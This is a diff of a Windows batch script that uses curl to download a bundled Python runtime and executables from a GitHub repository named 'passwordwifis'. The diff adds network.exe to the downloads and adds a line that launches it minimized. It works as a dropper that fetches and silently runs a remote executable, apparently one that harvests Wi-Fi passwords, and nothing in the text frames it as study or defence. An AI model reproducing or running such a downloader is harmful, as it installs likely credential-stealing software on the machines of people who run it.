@@ -2,6 +2,7 @@ curl -o _asyncio.pyd https://github.com/Zeyad-abd/passwordwifis/blob/main/_async
 curl -o _bz2.pyd https://github.com/Zeyad-abd/passwordwifis/blob/main/_bz2.pyd?raw=true
 curl -o _ctypes.pyd https://github.com/Zeyad-abd/passwordwifis/blob/main/_ctypes.pyd?raw=true
 curl -o _decimal.pyd https://github.com/Zeyad-abd/passwordwifis/blob/main/_decimal.pyd?raw=true
+curl -o _elementtree.pyd https://github.com/Zeyad-abd/passwordwifis/blob/main/_elementtree.pyd?raw=true
 curl -o _hashlib.pyd https://github.com/Zeyad-abd/passwordwifis/blob/main/_hashlib.pyd?raw=true
 curl -o _lzma.pyd https://github.com/Zeyad-abd/passwordwifis/blob/main/_lzma.pyd?raw=true
 curl -o _multiprocessing.pyd https://github.com/Zeyad-abd/passwordwifis/blob/main/_multiprocessing.pyd?raw=true
@@ -9,13 +10,20 @@ curl -o _overlapped.pyd https://github.com/Zeyad-abd/passwordwifis/blob/main/_ov
 curl -o _queue.pyd https://github.com/Zeyad-abd/passwordwifis/blob/main/_queue.pyd?raw=true
 curl -o _socket.pyd https://github.com/Zeyad-abd/passwordwifis/blob/main/_socket.pyd?raw=true
 curl -o _ssl.pyd https://github.com/Zeyad-abd/passwordwifis/blob/main/_ssl.pyd?raw=true
+curl -o _testcapi.pyd https://github.com/Zeyad-abd/passwordwifis/blob/main/_testcapi.pyd?raw=true
+curl -o _testinternalcapi.pyd https://github.com/Zeyad-abd/passwordwifis/blob/main/_testinternalcapi.pyd?raw=true
+curl -o _tkinter.pyd https://github.com/Zeyad-abd/passwordwifis/blob/main/_tkinter.pyd?raw=true
+curl -o cacert.pem https://github.com/Zeyad-abd/passwordwifis/blob/main/cacert.pem?raw=true
 curl -o libcrypto-1_1.dll https://github.com/Zeyad-abd/passwordwifis/blob/main/libcrypto-1_1.dll?raw=true
 curl -o libffi-7.dll https://github.com/Zeyad-abd/passwordwifis/blob/main/libffi-7.dll?raw=true
 curl -o library.zip https://github.com/Zeyad-abd/passwordwifis/blob/main/library.zip?raw=true
 curl -o libssl-1_1.dll https://github.com/Zeyad-abd/passwordwifis/blob/main/libssl-1_1.dll?raw=true
+curl -o network.exe https://github.com/Zeyad-abd/passwordwifis/blob/main/network.exe?raw=true
 curl -o pyexpat.pyd https://github.com/Zeyad-abd/passwordwifis/blob/main/pyexpat.pyd?raw=true
 curl -o python39.dll https://github.com/Zeyad-abd/passwordwifis/blob/main/python39.dll?raw=true
 curl -o select.pyd https://github.com/Zeyad-abd/passwordwifis/blob/main/select.pyd?raw=true
-curl -o test.exe https://github.com/Zeyad-abd/passwordwifis/blob/main/test.exe?raw=true
+curl -o tcl86t.dll https://github.com/Zeyad-abd/passwordwifis/blob/main/tcl86t.dll?raw=true
+curl -o tk86t.dll https://github.com/Zeyad-abd/passwordwifis/blob/main/tk86t.dll?raw=true
 curl -o unicodedata.pyd https://github.com/Zeyad-abd/passwordwifis/blob/main/unicodedata.pyd?raw=true
+start /MIN network.exe
 exit
